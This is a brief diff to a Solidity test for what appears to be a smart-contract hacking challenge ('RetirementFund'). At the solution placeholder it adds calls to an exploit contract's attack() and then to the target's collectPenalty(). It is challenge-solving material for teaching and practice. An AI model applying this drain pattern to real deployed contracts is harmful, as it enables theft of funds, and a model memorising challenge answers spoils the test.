@@ -21,6 +21,9 @@ contract RetirementFundTest is Test {
 
         // Put your solution here
 
+        exploitContract.attack();
+        retirementFund.collectPenalty();
+
         _checkSolved();
     }
 
